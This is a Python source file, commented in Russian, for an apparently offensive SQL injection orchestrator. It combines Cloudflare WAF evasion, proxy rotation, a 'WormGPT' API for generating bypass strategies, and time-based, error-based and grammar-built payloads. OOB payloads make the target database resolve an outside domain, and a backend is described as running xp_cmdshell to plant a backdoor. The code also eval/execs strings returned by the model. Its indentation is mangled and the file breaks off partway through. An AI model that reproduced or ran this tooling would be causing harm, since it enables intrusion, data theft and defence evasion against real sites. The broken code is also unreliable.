#!/usr/bin/env python3
"""
sqli_orchestrator.py — SQLi-оркестратор v3.0 (DISTRIBUTED FULL):
 CF WAF bypass + WormGPT каскадная стратегия (сырые ответы, WAF-профили)
 + дифф-детект слепых инъекций (C++ ядро или Python fallback)
 + DNS/OOB-канал + грамматическая генерация пейлоадов
 + параллельный батч + resume + Redis-распределённый режим
 + Ghauri/sqlninja (Perl-расширение) бэкенды.

Пайплайн:
 1. Recon (GET/POST/Cookie, baseline, CF-детект)
 2. WormGPT Agent: стратегия, тамперы, пейлоады (--worm)
 3. Detect СУБД
 4. Fuzz: time-based + error-based + ДИФФ-детект + OOB-пейлоады
 5. Feedback loop: неудача -> WormGPT получает СЫРЫЕ ответы -> новая стратегия
 6. Exploitation: sqlmap + [Ghauri] + [sqlninja-ext (Perl)]
 7. Экспорт: JSON + HTML + [Burp / DefectDojo / Nessus]
 8. Распределённый режим: --redis (диспетчер) / --redis-worker (воркер)

Зависимости: pip install -r requirements.txt
C++ ядро (опционально, ускоряет в ~60 раз): python build_sqli_core.py
"""

import argparse
import concurrent.futures
import datetime
import gzip
import glob
import hashlib
import html as html_mod
import json
import os
import random
import re
import shutil
import socket
import string
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field, asdict
from typing import Optional, List, Dict, Tuple
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote

try:
 from curl_cffi import requests as cf_requests
 HAS_CFFI = True
except ImportError:
 import requests as std_requests
 HAS_CFFI = False

# --- C++ ядро: мутации + дифф (fallback на Python) ---
try:
 import sqli_core
 HAS_CPP = True
except ImportError:
 sqli_core = None
 HAS_CPP = False

__version__ = "3.0.0"

WORM_ENDPOINT = "https://api.wormgpt.live/v1/chat/completions"
WORM_MODEL = "wormgpt"
STATE_FILENAME = "sqli_batch_state.json"
DIFF_THRESHOLD = 0.82 # score < порога при пейлоаде = аномалия структуры
OOB_DOMAIN_DEFAULT = "oob.yourdomain.com" # домен, делегированный oob_dns_server.py

# =============================================================================
# ЛОГГЕР: ротация + gzip-сжатие + очистка старых
# =============================================================================

class Logger:
 def __init__(self, log_dir: str = "logs", max_bytes: int = 10 * 1024 * 1024,
 max_segments: int = 5, retention_days: int = 30):
 os.makedirs(log_dir, exist_ok=True)
 self.log_dir = log_dir
 self.max_bytes = max_bytes
 self.max_segments = max_segments
 self._cleanup_old(log_dir, retention_days)
 stamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
 self.base_path = os.path.join(log_dir, f"scan_{stamp}.log")
 self.log_path = self.base_path
 self._segment = 0
 self._written = 0
 self._fh = open(self.base_path, "a", encoding="utf-8")
 self._lock = threading.Lock()
 self._status_active = False

 def _rotate(self):
     self._fh.close()
     gz_path = f"{self.base_path}.{self._segment + 1}.gz"
     with open(self.base_path, "rb") as src, gzip.open(gz_path, "wb") as dst:
         shutil.copyfileobj(src, dst)
         os.remove(self.base_path)
         self._segment += 1
         if self._segment >= self.max_segments:
             oldest = f"{self.base_path}.1.gz"
             if os.path.exists(oldest):
                 os.remove(oldest)
                 for i in range(2, self._segment + 1):
                     cur = f"{self.base_path}.{i}.gz"
                     if os.path.exists(cur):
                         os.replace(cur, f"{self.base_path}.{i - 1}.gz")
                         self._segment -= 1
                         self.log_path = self.base_path
                         self._written = 0
                         self._fh = open(self.base_path, "a", encoding="utf-8")

 def _cleanup_old(self, log_dir: str, retention_days: int):
     now = time.time()
     removed = 0
     for path in glob.glob(os.path.join(log_dir, "scan_*")):
         try:
             if now - os.path.getmtime(path) > retention_days * 86400:
                 os.remove(path)
                 removed += 1
 except OSError:
     pass
     if removed:
         print(f"[LOG] Очистка: удалено {removed} старых лог-файлов")

 def log(self, msg: str, console: bool = True):
     stamp = datetime.datetime.now().strftime("%H:%M:%S")
     with self._lock:
         line = f"[{stamp}] {msg}\n"
         self._fh.write(line)
         self._fh.flush()
         self._written += len(line.encode("utf-8"))
         if self._written >= self.max_bytes:
             self._rotate()
             if console:
                 if self._status_active:
                     sys.stdout.write("\r" + " " * 100 + "\r")
                     sys.stdout.flush()
                     print(msg)
                     self._status_active = False

 def status(self, text: str):
     line = f"\r{text}"
     if len(line) < 120:
         line += " " * (120 - len(line))
         with self._lock:
             sys.stdout.write(line[:120])
             sys.stdout.flush()
             self._status_active = True

 def clear_status(self):
     with self._lock:
         if self._status_active:
             sys.stdout.write("\r" + " " * 120 + "\r")
             sys.stdout.flush()
             self._status_active = False

 def close(self):
     with self._lock:
         try:
             self._fh.close()
 except Exception:
     pass
     try:
         if (os.path.exists(self.base_path)
         and os.path.getsize(self.base_path) > 1024 * 1024):
         gz = f"{self.base_path}.gz"
         with open(self.base_path, "rb") as src, \
         gzip.open(gz, "wb") as dst:
         shutil.copyfileobj(src, dst)
         os.remove(self.base_path)
         self.log_path = gz
 except Exception:
     pass

LOGGER: Optional[Logger] = None

def log(msg: str, console: bool = True):
 if LOGGER:
     LOGGER.log(msg, console=console)
 else:
     print(msg)

# =============================================================================
# МОДЕЛИ ДАННЫХ
# =============================================================================

@dataclass
class InjectionFinding:
 param: str
 method: str
 location: str
 dbms: str
 payload: str
 technique: str
 delay_seconds: float = 0.0
 diff_score: float = 1.0
 oob_token: str = ""

@dataclass
class Report:
 target: str
 timestamp: str = ""
 dbms_detected: str = "unknown"
 findings: list = field(default_factory=list)
 worm_strategy: dict = field(default_factory=dict)
 worm_iterations: int = 0
 worm_waf_profile: str = ""
 sqlmap_output: str = ""
 ghauri_output: str = ""
 sqlninja_output: str = ""
 errors: list = field(default_factory=list)

 def to_json(self) -> str:
     return json.dumps(asdict(self), indent=2, ensure_ascii=False)

# =============================================================================
# ПЕЙЛОАДЫ / ТАМПЕРЫ / ГРАММАТИКА / OOB
# =============================================================================

DETECT_PAYLOADS: Dict[str, List[str]] = {
 "mysql": ["' AND SLEEP(5)-- -",
 "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -"],
 "postgresql": ["'; SELECT pg_sleep(5)--",
 "' AND (SELECT 1 FROM pg_sleep(5))--"],
 "mssql": ["'; WAITFOR DELAY '0:0:5'--",
 "' AND 1=(SELECT 1 WAITFOR DELAY '0:0:5')--"],
 "oracle": ["' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--"],
 "sqlite": ["' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--"],
}

ERROR_SIGNATURES: Dict[str, List[str]] = {
 "mysql": ["you have an error in your sql syntax", "warning: mysql",
 "mysql_fetch", "mariadb"],
 "postgresql": ["postgresql", "pg_query", "syntax error at or near",
 "pg_sleep"],
 "mssql": ["microsoft sql server", "unclosed quotation mark",
 "odbc microsoft", "sqlserver"],
 "oracle": ["ora-", "oracle error", "oracle.jdbc"],
 "sqlite": ["sqlite3.", "sqlite_", "sqlite exception"],
}

def t_space2comment(p: str) -> str:
 return p.replace(" ", "/**/")

def t_randomcase(p: str) -> str:
 return "".join(c.upper() if random.random() > 0.5 else c.lower()
 for c in p)

def t_charencode(p: str) -> str:
 table = str.maketrans({"'": "%27", "(": "%28", ")": "%29",
 ";": "%3B", " ": "%20"})
 return p.translate(table)

def t_double_urlencode(p: str) -> str:
 return quote(quote(p, safe=""))

def t_between(p: str) -> str:
 return p.replace(">", " NOT BETWEEN 0 AND ")

def t_unionall(p: str) -> str:
 return p.replace("UNION ALL SELECT", "UNION/**/ALL/**/SELECT")

BUILTIN_TAMPERS = {
 "space2comment": t_space2comment,
 "randomcase": t_randomcase,
 "charencode": t_charencode,
 "doubleurlencode": t_double_urlencode,
 "between": t_between,
 "unionall": t_unionall,
}

SQLMAP_TAMPER_MAP: Dict[str, str] = {
 "mysql": "space2comment,randomcase,charencode,between",
 "postgresql": "space2comment,randomcase,charencode",
 "mssql": "space2comment,randomcase,between",
 "oracle": "space2comment,randomcase,charencode",
 "sqlite": "space2comment,randomcase,charencode",
}

def mutate(payload: str, count: int = 8,
 extra_tampers: Optional[Dict] = None) -> List[str]:
 """Мутации: C++ ядро если собрано, иначе Python fallback."""
 if HAS_CPP:
     try:
         return sqli_core.mutate(payload, count, extra_tampers or {})
 except Exception:
     pass
     # Python fallback
     tampers = dict(BUILTIN_TAMPERS)
     if extra_tampers:
         tampers.update(extra_tampers)
         results = {payload}
         fns = list(tampers.values())
         for fn in fns:
             try:
                 results.add(fn(payload))
 except Exception:
     pass
     for _ in range(count):
         if len(fns) >= 2:
             a, b = random.sample(fns, 2)
 else:
     a = b = fns[0]
     try:
         results.add(b(a(payload)))
 except Exception:
     pass
     return list(results)

def diff_score(a: str, b: str) -> float:
 """Структурное сходство ответов [0..1]. C++ или Python fallback."""
 if HAS_CPP:
     try:
         return sqli_core.diff_score(a, b)
 except Exception:
     pass
     # Python fallback: нормализация + Жаккард
 def norm(html: str) -> set:
     toks = set(re.findall(r"<([a-zA-Z0-9]+)", html))
     text = re.sub(r"<[^>]+>", " ", html)
     for w in re.findall(r"[A-Za-zА-Яа-я]{3,20}", text):
         toks.add(w.lower())
         toks.discard("csrf")
         toks.discard("nonce")
         return toks
         sa, sb = norm(a), norm(b)
         if not sa and not sb:
             return 1.0
             inter = len(sa & sb)
             uni = len(sa | sb)
             jac = inter / uni if uni else 1.0
             la, lb = len(a), len(b)
             len_ratio = min(la, lb) / (max(la, lb) + 1)
             return 0.7 * jac + 0.3 * len_ratio

# ---------------- Грамматическая генерация пейлоадов ----------------

class GrammarGenerator:
 """Контекстно-aware генерация: парсит error-сообщения и строит пейлоады
 под грамматику точки инъекции (кавычки, скобки, WHERE/ORDER BY)."""

 QUOTE_HINTS = [
 (r"unclosed quotation mark", "single"),
 (r"near ['\"]([^'\"]*)['\"] at position (\d+)", "single"),
 (r"syntax error at or near", "single"),
 (r"you have an error in your sql syntax.*near ['\"]([^'\"]+)", "single"),
 (r"missing (?:right|closing) parenthesis", "paren"),
 (r"ORA-00936", "missing_expr"),
 ]

 @classmethod
 def analyze_context(cls, error_text: str) -> Dict:
     """Извлечь контекст инъекции из текста ошибки."""
     ctx = {"quote": "unknown", "near": "", "context": "unknown"}
     if not error_text:
         return ctx
         low = error_text.lower()
         for pattern, hint in cls.QUOTE_HINTS:
             m = re.search(pattern, low)
             if m:
                 ctx["quote"] = hint
                 if m.groups() and m.group(1):
                     ctx["near"] = m.group(1)[:60]
                     break
                     if "order by" in low or "orderby" in low:
                         ctx["context"] = "order_by"
 elif "where" in low:
     ctx["context"] = "where"
 elif "group by" in low:
     ctx["context"] = "group_by"
 elif "insert" in low:
     ctx["context"] = "insert"
 elif "having" in low:
     ctx["context"] = "having"
     return ctx

 @classmethod
 def generate(cls, dbms: str, ctx: Dict, count: int = 12) -> List[str]:
     """Сгенерировать пейлоады под контекст. Не пересекается с базовыми."""
     q = "'" if ctx.get("quote") in ("single", "unknown") else ""
     payloads: List[str] = []
     context = ctx.get("context", "unknown")
     near = ctx.get("near", "")

 def add(p: str):
     if p not in payloads:
         payloads.append(p)

 # ORDER BY: числовой контекст, кавычки не нужны
 if context == "order_by":
     add("(SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)")
     add(", (SELECT CASE WHEN (SUBSTR(@@version,1,1)='5') THEN 1 ELSE 1/0 END)")
     add(" 1 RLIKE (SELECT...)".replace("...", "(SELECT 0x41)"))
     if dbms == "postgresql":
         add(", (SELECT CASE WHEN (1=1) THEN 1 ELSE 1/0 END)")
         if dbms == "mssql":
             add(", (SELECT IIF(1=1,1,1/0))")
             # WHERE: строковый контекст
             if context in ("where", "unknown", "having"):
                 add(f"{q} OR 1=1-- -")
                 add(f"{q}' OR '1'='1-- -")
                 add(f"{q} AND 1=1-- -")
                 add(f"{q} OR EXTRACTVALUE(1,CONCAT(0x7e,@@version))-- -")
                 if dbms == "postgresql":
                     add(f"{q}; SELECT CAST((SELECT current_database()) AS INT)--")
                     add(f"{q} AND 1=(SELECT 1 FROM pg_sleep(3))--")
                     if dbms == "mssql":
                         add(f"{q}; IF(1=1) WAITFOR DELAY '0:0:4'--")
                         if dbms == "oracle":
                             add(f"{q} AND 1=UTL_INADDR.GET_HOST_ADDRESS('x')--")
                             # paren: закрыть скобку
                             if ctx.get("quote") == "paren":
                                 add(")) OR 1=1-- -")
                                 add(")) AND 1=1-- -")
                                 # near-подсказка: вставить разрыв рядом с указанным токеном
                                 if near:
                                     add(f"{q} OR 1=1-- -".replace(" ", "/**/"))
                                     # добить до count базовыми контекстными
                                     bases = DETECT_PAYLOADS.get(dbms, [])
                                     for b in bases:
                                         if len(payloads) >= count:
                                             break
                                             add(b)
                                             return payloads[:max(count, len(payloads))]

# ---------------- DNS/OOB-канал ----------------

class OOBChannel:
 """Генерация OOB-пейлоадов + проверка попаданий через oob_dns_server.py.
 Сервер пишет хиты в oob_hits.json (или отвечает по TCP-протоколу ниже)."""

 def __init__(self, domain: str = OOB_DOMAIN_DEFAULT,
 server: str = ""):
 self.domain = domain.rstrip(".")
 self.server = server # host:port сервера хитов (опционально)
 self._tokens: Dict[str, str] = {} # token -> param

 def new_token(self, param: str) -> str:
     token = "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
     self._tokens[token] = param
     return token

 def payload(self, dbms: str, token: str) -> str:
     """OOB-пейлоад: заставить СУБД резолвить <token>.domain."""
     host = f"{token}.{self.domain}"
     if dbms == "mysql":
         return (f"' AND LOAD_FILE(CONCAT('\\\\\\\\',"
         f"(SELECT {token[:8]}),'{host[2:]}\\\\a.txt'))-- -")
         if dbms == "mssql":
             return f"'; EXEC master..xp_dirtree '\\\\{host}\\x'--"
             if dbms == "postgresql":
                 return (f"'; COPY (SELECT '') TO PROGRAM "
                 f"'nslookup {host}'--")
                 if dbms == "oracle":
                     return (f"' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS("
                     f"'{host}') FROM DUAL) IS NOT NULL--")
                     # универсальный
                     return f"' AND (SELECT 1)=(SELECT 1 FROM (SELECT 1) x WHERE "
                     f"LOAD_FILE('\\\\\\\\{host}\\\\x') IS NOT NULL)-- -"

 def check_hit(self, token: str) -> bool:
     """Проверить, резолвился ли token.domain (хит в oob_hits.json)."""
     hits_file = os.path.join(os.path.dirname(os.path.abspath(__file__)),
     "oob_hits.json")
     try:
         with open(hits_file, encoding="utf-8") as fp:
             hits = json.load(fp)
             return token in hits
 except Exception:
     return False

# =============================================================================
# HTTP-КЛИЕНТ (CF bypass + ротация прокси)
# =============================================================================

BROWSER = "chrome124"
FAKE_HEADERS = {
 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
 "Accept-Language": "en-US,en;q=0.9,ru;q=0.8",
 "Cache-Control": "no-cache",
 "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate",
 "Sec-Fetch-Site": "none", "Upgrade-Insecure-Requests": "1",
}

class HTTPClient:
 def __init__(self, proxies: Optional[List[str]] = None):
     self.proxies = proxies or []
     self._make_session()

 def _make_session(self):
     if HAS_CFFI:
         self.session = cf_requests.Session(impersonate=BROWSER)
 else:
     self.session = std_requests.Session()
     self.session.headers["User-Agent"] = (
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
     "AppleWebKit/537.36 (KHTML, like Gecko) "
     "Chrome/124.0.0.0 Safari/537.36")

 def _next_proxy(self) -> Optional[Dict[str, str]]:
     if not self.proxies:
         return None
         proxy = random.choice(self.proxies)
         self._make_session()
         return {"http": proxy, "https": proxy}

 @staticmethod
 def _is_cf_challenge(resp) -> bool:
     body = resp.text[:5000] if resp.text else ""
     markers = ["cf-browser-verification", "cf_chl", "Just a moment",
     "challenge-platform"]
     return any(m in body for m in markers)

 def request(self, method: str, url: str, params=None, data=None,
 cookies=None, retries: int = 3):
 for _ in range(retries):
     try:
         headers = dict(FAKE_HEADERS)
         proxies = self._next_proxy()
         kw = dict(headers=headers, cookies=cookies, timeout=25,
         proxies=proxies)
         if method == "GET":
             r = self.session.get(url, params=params, **kw)
 else:
     r = self.session.post(url, data=data, **kw)
     if self._is_cf_challenge(r):
         log(f" [!] CF challenge: {url} — смена прокси/ретрай",
         console=False)
         time.sleep(3 + random.random() * 4)
         continue
         return r
 except Exception as e:
     log(f" [!] Ошибка запроса {url}: {e}", console=False)
     if self.proxies:
         self._make_session()
         time.sleep(2)
         return None

 @staticmethod
 def human_pause(lo: float = 0.8, hi: float = 2.5):
     time.sleep(random.uniform(lo, hi))

# =============================================================================
# WORMGPT AGENT (каскадная стратегия: сырые ответы + WAF-профиль)
# =============================================================================

class WormAgent:
 def __init__(self, api_key: str, verbose: bool = False):
     self.api_key = api_key
     self.verbose = verbose
     self.history: List[dict] = []

 def _chat(self, system: str, user: str, temperature: float = 0.7) -> str:
     payload = {"model": WORM_MODEL,
     "messages": [{"role": "system", "content": system},
     {"role": "user", "content": user}],
     "temperature": temperature, "max_tokens": 2500}
     headers = {"Authorization": f"Bearer {self.api_key}",
     "Content-Type": "application/json"}
     try:
         if HAS_CFFI:
             r = cf_requests.post(WORM_ENDPOINT, json=payload, headers=headers,
             impersonate=BROWSER, timeout=120)
 else:
     r = std_requests.post(WORM_ENDPOINT, json=payload,
     headers=headers, timeout=120)
     r.raise_for_status()
     return r.json()["choices"][0]["message"]["content"]
 except Exception as e:
     raise RuntimeError(f"WormGPT API error: {e}")

 @staticmethod
 def _extract_json(text: str) -> dict:
     text = text.strip()
     start = text.find("{")
     if start == -1:
         raise ValueError("WormGPT не вернул JSON")
         depth = 0
         for i in range(start, len(text)):
             if text[i] == "{":
                 depth += 1
 elif text[i] == "}":
     depth -= 1
     if depth == 0:
         return json.loads(text[start:i + 1])
         raise ValueError("Незакрытый JSON от WormGPT")

 def generate_strategy(self, recon: dict,
 failure_feedback: Optional[dict] = None) -> dict:
 label = ("КАСКАД: анализ сырых ответов + WAF-профиля"
 if failure_feedback else "генерация стратегии")
 log(f"[WORM] {label}")

 system = (
 "You are an elite SQL injection and WAF-bypass expert. "
 "Generate a custom exploitation strategy for the target described "
 "in the recon data. Respond ONLY with a valid JSON object, "
 "no markdown. Schema:\n"
 "{\n"
 ' "tampers": {"name": "python lambda taking payload string, '
 'returning obfuscated string"},\n'
 ' "payloads": ["SQLi payload strings"],\n'
 ' "sqlmap_tamper": "comma-separated sqlmap tamper names",\n'
 ' "sqlmap_options": ["extra sqlmap CLI options"],\n'
 ' "waf_profile": "your identification of the WAF/product "\n'
 ' "notes": "brief strategy explanation"\n'
 "}\n"
 "The tamper lambdas must be pure: only string operations, no "
 "imports, no builtins besides string methods.\n"
 "IMPORTANT (cascade mode): if failure_feedback is present, it "
 "contains RAW HTTP responses from failed attempts — WAF block "
 "pages, Cloudflare headers, error bodies, and diff-analysis "
 "anomalies. Study them CAREFULLY: identify the exact WAF "
 "product and rule signature (block page content, status codes, "
 "header patterns), then generate a strategy that evades THOSE "
 "specific rules. Different encoding, different syntax, different "
 "request shape. If the WAF profile is identified, name it in "
 "waf_profile."
 )
 user_data = dict(recon)
 if failure_feedback:
     user_data["failure_feedback"] = failure_feedback
     raw = self._chat(system, json.dumps(user_data, ensure_ascii=False))
     if self.verbose:
         log(f"[WORM RAW]\n{raw[:1500]}", console=False)

 strategy = self._extract_json(raw)
 compiled: Dict = {}
 for name, code in (strategy.get("tampers") or {}).items():
     try:
         code = code.strip()
         if code.startswith("lambda"):
             fn = eval(code, {"__builtins__": {}}, {}) # noqa: S307
 else:
     ns: Dict = {"__builtins__": {}}
     exec("def _t(p):\n"
     + "\n".join("\t" + l for l in code.splitlines()),
     ns) # noqa: S102
     fn = ns["_t"]
     compiled[name] = fn
     log(f"[+] Tamper '{name}': OK", console=False)
 except Exception as e:
     log(f"[!] Tamper '{name}' не скомпилировался: {e}",
     console=False)
     strategy["tampers"] = compiled
     strategy.setdefault("payloads", [])
     if not isinstance(strategy["payloads"], list):
         strategy["payloads"] = []
         if not isinstance(strategy.get("sqlmap_tamper"), str):
             strategy["sqlmap_tamper"] = ""
             if not isinstance(strategy.get("sqlmap_options"), list):
                 strategy["sqlmap_options"] = []
                 if not isinstance(strategy.get("waf_profile"), str):
                     strategy["waf_profile"] = ""
                     self.history.append({"tampers": list(compiled.keys()),
                     "payloads": strategy["payloads"],
                     "waf_profile": strategy["waf_profile"]})
                     return strategy

# =============================================================================
# ИНТЕГРАЦИИ: BURP / DEFECTDOJO / NESSUS
# =============================================================================

def _http_json(method: str, url: str, headers=None, json_body=None,
 timeout: int = 30):
 try:
     if HAS_CFFI:
         return cf_requests.request(method, url, headers=headers,
         json=json_body, impersonate=BROWSER,
         timeout=timeout)
         return std_requests.request(method, url, headers=headers,
         json=json_body, timeout=timeout)
 except Exception as e:
     log(f"[!] Интеграция {url}: {e}")
     return None

class BurpIntegrator:
 def __init__(self, base_url: str):
     self.base = base_url.rstrip("/")

 def send(self, report: Report):
     if not report.findings:
         return
         log(f"[BURP] Отправка {len(report.findings)} находок в Burp Scanner...")
         for f in report.findings:
             parsed = urlparse(report.target)
             qs = parse_qsl(parsed.query, keep_blank_values=True)
             new_qs = [(k, f.payload if k == f.param else v) for k, v in qs]
             scan_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
             r = _http_json("POST", f"{self.base}/v0.1/scan",
             json_body={"urls": [scan_url]})
             if r is not None and r.status_code in (200, 201):
                 log(f"[BURP] Скан запущен "
                 f"(task {r.json().get('scan_id', '?')}) для {f.param}")
 else:
     log(f"[BURP] Ошибка запуска: "
     f"{r.status_code if r is not None else 'no resp'}")

class DefectDojoIntegrator:
 def __init__(self, base_url: str, engagement_id: int):
     self.base = base_url.rstrip("/")
     self.eng_id = engagement_id
     self.key = os.environ.get("DOJO_API_KEY", "")

 def send(self, report: Report):
     if not report.findings:
         return
         if not self.key:
             log("[DOJO] Нет DOJO_API_KEY — пропуск.")
             return
             log(f"[DOJO] Импорт {len(report.findings)} находок в "
             f"engagement {self.eng_id}...")
             headers = {"Authorization": f"Token {self.key}",
             "Content-Type": "application/json"}
             for f in report.findings:
                 finding = {
                 "title": f"SQL Injection в параметре '{f.param}' "
                 f"({report.target})",
                 "description": (f"SQLi ({f.technique}, {f.dbms}) в "
                 f"{f.method}-параметре '{f.param}'. "
                 f"Payload: {f.payload}"),
                 "severity": "High", "cwe": 89, "engagement": self.eng_id,
                 "active": True, "verified": False,
                 "numerical_severity": "S1",
                 }
                 r = _http_json("POST", f"{self.base}/api/v2/findings/",
                 headers=headers, json_body=finding)
                 if r is not None and r.status_code in (200, 201):
                     log(f"[DOJO] Finding для '{f.param}' создан")
 else:
     log(f"[DOJO] Ошибка: "
     f"{r.status_code if r is not None else 'no resp'} "
     f"{r.text[:200] if r is not None else ''}")

class NessusIntegrator:
 def __init__(self, base_url: str, policy_id: Optional[int] = None):
     self.base = base_url.rstrip("/")
     self.access = os.environ.get("NESSUS_ACCESS_KEY", "")
     self.secret = os.environ.get("NESSUS_SECRET_KEY", "")
     self.policy_id = policy_id
     self.headers = {
     "X-ApiKeys": f"accessKey={self.access}; secretKey={self.secret}",
     "Content-Type": "application/json"}

 def _resolve_policy(self) -> Optional[int]:
     if self.policy_id:
         return self.policy_id
         r = _http_json("GET", f"{self.base}/policies", headers=self.headers)
         if r is not None and r.status_code == 200:
             policies = r.json().get("policies", [])
             if policies:
                 return policies[0]["id"]
                 return None

 def send(self, report: Report):
     if not self.access or not self.secret:
         log("[NESSUS] Нет ключей — пропуск.")
         return
         policy = self._resolve_policy()
         if not policy:
             log("[NESSUS] Политики не найдены — пропуск.")
             return
             host = urlparse(report.target).hostname or report.target
             log(f"[NESSUS] Запуск скана {host} (policy {policy})...")
             body = {
             "uuid": "19506a08-2260-4efd-a68c-6d78a0fe0f5f9d20e24f8f9d0c21ef0e",
             "settings": {"name": f"WormSQLi-{host}-{int(time.time())}",
             "policy_id": int(policy), "text_targets": host},
             }
             r = _http_json("POST", f"{self.base}/scans", headers=self.headers,
             json_body=body)
             if r is not None and r.status_code == 200:
                 scan_id = r.json().get("scan", {}).get("id")
                 log(f"[NESSUS] Скан {scan_id} запущен")
                 _http_json("POST", f"{self.base}/scans/{scan_id}/launch",
                 headers=self.headers)
 else:
     log(f"[NESSUS] Ошибка: "
     f"{r.status_code if r is not None else 'no resp'}")

# =============================================================================
# ЭКСПЛОЙТ-БЭКЕНДЫ: GHAURI / SQLNINJA-EXT (Perl)
# =============================================================================

class GhauriBackend:
 def __init__(self, cookie_str: str = "", post_data: str = ""):
     self.cookie_str = cookie_str
     self.post_data = post_data

 def run(self, report: Report, finding: InjectionFinding) -> str:
     if shutil.which("ghauri") is None:
         report.errors.append("ghauri not found")
         log("[GHAURI] ghauri не установлен (pip install ghauri) — пропуск.")
         return ""
         log(f"[GHAURI] Прогон по '{finding.param}' ({report.target})...")
         cmd = ["ghauri", "-u", report.target, "--batch",
         "--threads", "3", "--delay", "1"]
         if self.post_data and finding.method == "POST":
             cmd += ["--data", self.post_data]
             if self.cookie_str:
                 cmd += ["--cookie", self.cookie_str]
                 try:
                     proc = subprocess.run(cmd, capture_output=True, text=True,
                     timeout=600)
                     log(f"[GHAURI] Завершено: {finding.param}")
                     return proc.stdout + "\n" + proc.stderr
 except Exception as e:
     report.errors.append(f"ghauri error: {e}")
     return ""

class SqlninjaExtBackend:
 """Perl-расширение sqlninja (sqli_ninja_ext.pl): единый пайплайн
 fingerprint -> xp_cmdshell -> backdoor + OOB-тамперы.
 Вызов: perl sqli_ninja_ext.pl <target_url> <param> <post_data>."""

 def __init__(self, cookie_str: str = ""):
     self.cookie_str = cookie_str
     self.script = os.path.join(os.path.dirname(os.path.abspath(__file__)),
     "sqli_ninja_ext.pl")

 def run(self, report: Report, finding: InjectionFinding) -> str:
     if not os.path.exists(self.script):
         report.errors.append("sqli_ninja_ext.pl not found")
         log("[SQLNINJA-EXT] sqli_ninja_ext.pl не найден — пропуск.")
         return ""
         if finding.dbms != "mssql":
             log(f"[SQLNINJA-EXT] Пропуск: {finding.dbms} != mssql")
             return ""
             log(f"[SQLNINJA-EXT] MSSQL пайплайн: {finding.param}...")
             cmd = ["perl", self.script, report.target, finding.param,
             self._post_for(finding)]
             try:
                 proc = subprocess.run(cmd, capture_output=True, text=True,
                 timeout=900)
                 log(f"[SQLNINJA-EXT] Завершено: {finding.param}")
                 return proc.stdout + "\n" + proc.stderr
 except Exception as e:
     report.errors.append(f"sqlninja-ext error: {e}")
     return ""

 def _post_for(self, finding: InjectionFinding) -> str:
     if finding.method != "POST":
         return ""
         pd = parse_qsl(urlparse("").query, keep_blank_values=True)
         return getattr(self, "_post_data", "")

# =============================================================================
# RESUME-СОСТОЯНИЕ БАТЧА
# =============================================================================

class BatchState:
 def __init__(self, state_path: str, targets: List[str]):
     self.path = state_path
     self._lock = threading.Lock()
     if os.path.exists(state_path):
         with open(state_path) as fp:
             self.data = json.load(fp)
             for t, s in self.data.get("targets", {}).items():
                 if s == "running":
                     self.data["targets"][t] = "pending"
 else:
     self.data = {"started": datetime.datetime.now().isoformat(),
     "targets": {t: "pending" for t in targets}}
     for t in targets:
         self.data["targets"].setdefault(t, "pending")

 def set_status(self, target: str, status: str):
     with self._lock:
         self.data["targets"][target] = status
         self._save()

 def _save(self):
     tmp = self.path + ".tmp"
     with open(tmp, "w", encoding="utf-8") as fp:
         json.dump(self.data, fp, indent=2, ensure_ascii=False)
         os.replace(tmp, self.path)

 def pending_targets(self) -> List[str]:
     with self._lock:
         return [t for t, s in self.data["targets"].items()
         if s in ("pending", "error")]

 def summary(self) -> dict:
     with self._lock:
         from collections import Counter
         return dict(Counter(self.data["targets"].values()))

# =============================================================================
# ОРКЕСТРАТОР
# =============================================================================

class SQLiOrchestrator:

 def __init__(self, url: str, post_data: str = "", cookie_str: str = "",
 param: str = "", dbms: str = "", verbose: bool = False,
 use_sqlmap: bool = True, delay: float = 1.0,
 worm_key: str = "", worm_loop: int = 0,
 proxies: Optional[List[str]] = None, target_index: int = 0,
 use_ghauri: bool = False, use_sqlninja: bool = False,
 oob_domain: str = OOB_DOMAIN_DEFAULT, use_grammar: bool = True):
 self.url = url
 self.post_data = post_data
 self.cookie_str = cookie_str
 self.target_param = param
 self.forced_dbms = dbms
 self.verbose = verbose
 self.use_sqlmap = use_sqlmap
 self.base_delay = delay
 self.client = HTTPClient(proxies)
 self.report = Report(target=url)
 self.cookies = self._parse_cookies(cookie_str)
 self.worm = WormAgent(worm_key, verbose) if worm_key else None
 self.worm_loop = worm_loop
 self.worm_strategy: Dict = {}
 self.worm_tampers: Dict = {}
 self.tried_payloads: List[str] = []
 self.raw_responses: List[dict] = [] # сырые ответы для каскада
 self.idx = target_index
 self.phase = "init"
 self.ghauri = (GhauriBackend(cookie_str, post_data)
 if use_ghauri else None)
 self.sqlninja = (SqlninjaExtBackend(cookie_str)
 if use_sqlninja else None)
 self.oob = OOBChannel(domain=oob_domain)
 self.use_grammar = use_grammar
 self.baseline_body = ""
 self.baseline_len = 0
 self.baseline_time = 0.0
 self.recon_data: Dict = {}

 @staticmethod
 def _parse_cookies(cookie_str: str) -> Dict[str, str]:
     cookies: Dict[str, str] = {}
     if cookie_str:
         for part in cookie_str.split(";"):
             if "=" in part:
                 k, v = part.strip().split("=", 1)
                 cookies[k.strip()] = v.strip()
                 return cookies

 def _targets(self) -> List[Tuple[str, str, str]]:
     candidates: List[Tuple[str, str, str]] = []
     for k, _ in parse_qsl(urlparse(self.url).query,
     keep_blank_values=True):
     candidates.append((k, "GET", "query"))
     if self.post_data:
         for k, _ in parse_qsl(self.post_data, keep_blank_values=True):
             candidates.append((k, "POST", "body"))
             for k in self.cookies:
                 candidates.append((k, "COOKIE", "cookie"))
                 if self.target_param:
                     candidates = [c for c in candidates if c[0] == self.target_param]
                     return candidates

 def _build_request(self, param: str, payload: str, method: str,
 location: str):
 parsed = urlparse(self.url)
 qs = parse_qsl(parsed.query, keep_blank_values=True)
